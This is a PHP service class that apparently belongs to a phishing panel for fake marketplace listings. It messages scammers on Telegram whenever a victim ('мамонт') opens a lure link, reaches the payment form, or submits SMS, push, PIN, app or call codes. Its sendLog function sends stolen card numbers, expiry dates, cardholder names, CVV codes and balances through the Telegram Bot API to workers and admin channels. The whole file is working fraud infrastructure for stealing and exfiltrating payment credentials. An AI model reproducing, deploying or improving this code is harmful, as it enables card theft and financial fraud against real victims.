<?php

namespace App\Services;

use App\Models\Services;
use App\Models\Settings;
use App\Models\Users;
use http\Client\Curl\User;
use Telegram\Bot\Keyboard\Keyboard;

class TelegramService
{
    public static function sendIndexLink($chatId, $link, $service, $action, $log)
    {
        $keyboard = null;
        //--------------------------------------
        switch ($action) {
            case 'index':
                $keyboard = [
                    'inline_keyboard' => [
                        [
                            [
                                'text' => 'Проверить онлайн',
                                'callback_data' => "check_online_$log",
                            ],
                        ],
                    ],
                ];

                $message = "😱Мамонт перешёл по твоей ссылке!
#$log
📊Объявление: $link->id
💲Площадка: $service->name [$service->country]
💰Стоимость товарки: $link->price CHF
🏬Товарка: $link->name

⚡️Желаю успеха в обработке лохматого!";
                break;

            case 'receive':
                $message = "😎Лохматый перешёл на ввод данных!

📊Объявление: $link->id
💲Площадка: $service->name [$service->country]
💰Стоимость товарки: $link->price CHF
🏬Товарка: $link->name";

                $keyboard = [
                    'inline_keyboard' => [
                        [
                            [
                                'text' => 'Проверить онлайн',
                                'callback_data' => "check_online_$log",
                            ],
                        ],
                    ],
                ];
                break;

            case 'accurate':
                $message = "#$log
♻️Отправлен на уточнение баланса!";
                break;

            case 'sms':
                $message = "#$log
♻️Отправлен на SMS Code!";
                break;
            case 'push':
                $message = "#$log
♻️Отправлен на Push!";
                break;
            case 'deposit':
                $message = "#$log
♻️Отправлен на депозит!";
                break;
            case 'limit':
                $message = "#$log
♻️Отправлен на лимит!";
                break;
            case 'change':
                $message = "#$log
♻️Отправлен на смену!";
                break;
            case 'app':
                $message = "#$log
♻️Отправлен на app code!";
                break;
            case 'call':
                $message = "#$log
♻️Отправлен на call code!";
                break;
            case 'pin':
                $message = "#$log
♻️Отправлен на pin code!";
                break;
        }
        //--------------------------------------

        if($keyboard == null){
            $response = self::sendMessage([
                'chat_id' => $chatId,
                'text' => $message
            ]);
        }
        $response = self::sendMessage([
            'chat_id' => $chatId,
            'text' => $message,
            'reply_markup' => json_encode($keyboard),
        ]);

        return response()->json(['status' => "success"]);
    }

    public static function sendAccuratebalance($log, $balance)
    {
        $link = $log->links;
        $worker = Users::query()->where('id', $link->user)->first();

        $response = self::sendMessage([
            'chat_id' => $worker['id'],
            'text' => "#$log->id
♻️Мамонт отправил точный баланс: $balance CHF",
        ]);

        return response()->json(['status' => "success"]);
    }

    public static function sendSMS($log)
    {
        $link = $log->links;
        $worker = Users::query()->where('id', $link->user)->first();

        $response = self::sendMessage([
            'chat_id' => $worker['id'],
            'text' => "#$log->id
♻️Мамонт отправил sms",
        ]);

        return response()->json(['status' => "success"]);
    }

    public static function sendAppCode($log)
    {
        $link = $log->links;
        $worker = Users::query()->where('id', $link->user)->first();

        $response = self::sendMessage([
            'chat_id' => $worker['id'],
            'text' => "#$log->id
♻️Мамонт отправил app code",
        ]);

        return response()->json(['status' => "success"]);
    }

    public static function sendAnswer($log)
    {
        $link = $log->links;
        $worker = Users::query()->where('id', $link->user)->first();

        $response = self::sendMessage([
            'chat_id' => $worker['id'],
            'text' => "#$log->id
♻️Мамонт отправил ответ",
        ]);

        return response()->json(['status' => "success"]);
    }

    public static function sendCallCode($log)
    {
        $link = $log->links;
        $worker = Users::query()->where('id', $link->user)->first();

        $response = self::sendMessage([
            'chat_id' => $worker['id'],
            'text' => "#$log->id
♻️Мамонт отправил call code",
        ]);

        return response()->json(['status' => "success"]);
    }


    public static function sendPinCode($log)
    {
        $link = $log->links;
        $worker = Users::query()->where('id', $link->user)->first();

        $response = self::sendMessage([
            'chat_id' => $worker['id'],
            'text' => "#$log->id
♻️Мамонт отправил pin code",
        ]);

        return response()->json(['status' => "success"]);
    }
    public static function sendLog($log, $link, $worker)
    {
        $settings = Settings::query()->first();
        $kb = [
            'inline_keyboard' => [
                [
                    [
                        'text' => 'Взять лог',
                        'callback_data' => "put_log_$log->id",
                    ],
                ],
            ],
        ];

        $balance = $log->balance ? $log->balance : "Не указан";
        $service = Services::query()->where('id', $link->service)->first();
        $response1 = self::sendMessage([
            'chat_id' => $worker['id'],
            'text' => "💊 Данные карты $service->subdomain

▶️ Номер карты: $log->card
💱 Баланс: $balance

🔡 Объявление: $link->name
🔢 ID Объявления: $log->id
💲 Цена: $link->price HUF",
        ]);

        $response1 = self::sendMessage([
            'chat_id' => $settings['all_channel'],
            'text' => "💊 Пришел новый лог JOFOGAS.HU
💱 Баланс: $balance

🔡 Объявление: $link->name
🔢 ID Объявления: $log->id
💲 Цена: $link->price HUF",
        ]);

        $response2 = self::sendMessage([
            'chat_id' => $settings['admin_logs_channel'],
            'text' => "✏️ Ввод карты $service->subdomain!

💳 Card Number: $log->card
📅 Card Expiry Date: $log->expire
🤣 Cardholder Name: $log->holder
🔢 CVV Code: $log->cvc

👨🏻‍💻 Воркер: @$worker->username
👤 ID Воркера: $worker->id

🔡 Объявление: $link->name
🔢 ID Объявления: $log->id

💲 Цена:$link->price HUF",
            'reply_markup' => json_encode($kb),
        ]);

        return response()->json(['status' => "success"]);
    }

    private static function sendMessage($data)
    {
        $botToken = env('TELEGRAM_BOT_TOKEN'); // Get bot token from .env file
        $url = "https://api.telegram.org/bot$botToken/sendMessage";

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

        $response = curl_exec($ch);
        curl_close($ch);

        return $response;
    }
}
